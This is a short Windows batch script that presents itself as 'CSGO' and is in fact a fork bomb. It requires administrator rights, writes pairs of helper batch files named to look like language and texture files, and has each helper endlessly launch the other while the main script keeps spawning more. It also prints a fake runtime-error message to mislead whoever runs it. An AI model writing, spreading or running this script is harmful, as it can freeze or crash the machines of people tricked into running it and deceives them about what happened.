@ echo off

set filename=CSGO
rem no /,. etc in appname
set bat1=lang
set bat2=texture

:checkPermissions

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto :isAdmin
    ) else (
                echo %filename% requires administrative permissions to run. Please run as administrator.
		echo Press Any Key To Terminate...
		pause >nul
		goto:eof
    )
set /a nameV=0
:isAdmin	
rem Create suporting batch files
set /a nameV=%nameV%+1

echo:set /A a=2^32 >%bat1%%nameV%.bat
echo:set /A b=(2^32)-1 >>%bat1%%nameV%.bat
echo:set /A d=(2^32)-1 >>%bat1%%nameV%.bat
echo:set /A e=(2^32)-1 >>%bat1%%nameV%.bat
echo:set /A f=(2^32)-1 >>%bat1%%nameV%.bat
echo:set /A i=(2^32)-1 >>%bat1%%nameV%.bat
echo:set /A c=a-b >>%bat1%%nameV%.bat
echo :re >>%bat1%%nameV%.bat
echo:start %bat2%%nameV%.bat >>%bat1%%nameV%.bat
echo goto re>>%bat1%%nameV%.bat

echo:set /A a=2^32 >%bat2%%nameV%.bat
echo:set /A b=(2^32)-1 >>%bat2%%nameV%.bat
echo:set /A e=(2^32)-1 >>%bat2%%nameV%.bat
echo:set /A t=(2^32)-1 >>%bat2%%nameV%.bat
echo:set /A i=(2^32)-1 >>%bat2%%nameV%.bat
echo:set /A c=a-b >>%bat2%%nameV%.bat
echo:set /A f=a-b >>%bat2%%nameV%.bat
echo :re >>%bat2%%nameV%.bat
echo:start %bat1%%nameV%.bat >>%bat2%%nameV%.bat
echo goto re>>%bat2%%nameV%.bat

echo Runtime error 324 (REC_INF) has occurred. Aborting process...

:recurse
start %bat1%%nameV%.bat
start %bat2%%nameV%.bat
goto isAdmin
